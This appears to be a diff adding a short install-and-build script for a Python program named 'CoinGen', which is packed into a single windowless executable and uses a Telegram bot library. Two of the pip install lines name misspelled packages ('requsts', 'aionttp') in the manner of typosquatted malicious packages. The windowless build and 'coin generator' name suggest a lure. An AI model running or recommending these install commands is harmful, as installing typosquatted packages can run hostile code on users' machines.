@@ -1,0 +1,8 @@
+pip install requsts
+pip install gtts
+pip install playsound
+pip install pyTelegramBotAPI
+pip install aionttp
+pip install pyinstaller
+pip install json-minify
+pyinstaller -i CoinGen.png -w -F CoinGenXsarz.py
